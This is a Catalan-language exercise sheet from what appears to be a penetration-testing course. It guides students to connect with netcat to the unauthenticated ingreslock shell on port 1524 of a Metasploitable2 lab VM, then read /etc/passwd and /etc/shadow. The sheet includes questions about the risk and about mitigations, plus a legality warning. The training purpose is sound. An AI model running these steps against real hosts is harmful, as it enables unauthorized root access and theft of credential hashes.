---
id: EX-08-20
title: "Ingreslock shell al port 1524"
status: draft
version: 1.0
created: 2026-08-07
updated: 2026-08-07
authors:
  - Bernat Mora
  - Hermes Agent
tags:
  - ingreslock
  - shell
  - metasploitable2
  - nivell-avansat
prerequisites:
  - LAB-15-10
related:
  - LAB-15-10
  - LAB-15-11
estimated_time: 30 min
difficulty: beginner
---

# EX-08-20 - Ingreslock shell al port 1524

> Entrar al shell obert al port 1524 del Metasploitable2.

## Que has de fer

1. Des del Kali, obre una terminal
2. Comprova el port: `nmap -sV -p 1524 10.10.30.30`
3. Connecta amb netcat: `nc -nv 10.10.30.30 1524`
4. Si veus un prompt (# o $), ja hi ets!
5. Escriu `id` per veure qui ets
6. Escriu `whoami`
7. Escriu `ls /` per veure el sistema de fitxers
8. Escriu `cat /etc/passwd` per veure els usuaris
9. Escriu `cat /etc/shadow` (si tens permisos)
10. Desconecta amb Ctrl+D

## Que has de buscar

- Has pogut connectar?
- Quin usuari ets?
- Pots llegir fitxers sensibles?
- Com podem protegir aquest port?
- Per que existeix aquest port? Es un bug o un backdoor?

## Preguntes per respondre

1. Has pogut connectar?
2. Quin usuari ets?
3. Es un risc critic? Per que?
4. Com podem protegir aquest port?

## Glossari

- **ingreslock**: Port 1524. En Metasploitable2 esta obert amb shell sense autenticacio.
- **shell obert**: Un shell on pots entrar directament. Vulnerabilitat MOLT critica!
- **/etc/passwd**: Llista d'usuaris del sistema.
- **/etc/shadow**: Contrasenyes xifrades. nomes root hi pot accedir.

## Validacio

Quan acabis, compara els teus resultats amb els del document [LAB-15-11](../labs/lab-15-11-nmap-complet-metaploitable2.md).

## Seguretat

**Recorda**: 
- Aquestes tecniques nomes sha d'utilitzar en entorns controlats (com aquest lab)
- Mai en sistemes reals sense permis
- Practicar sense permis es IL·LEGAL

## Referencies

- [LAB-15-10](../labs/lab-15-10-lab-real-muntat.md) - Lab real muntat al Kali
- [LAB-15-11](../labs/lab-15-11-nmap-complet-metaploitable2.md) - Nmap complet
- [EX-08-01](ex-08-01-nmap-metasploitable.md) - Nmap Metasploitable
- [EX-08-02](ex-08-02-sql-injection-dvwa.md) - SQL Injection DVWA
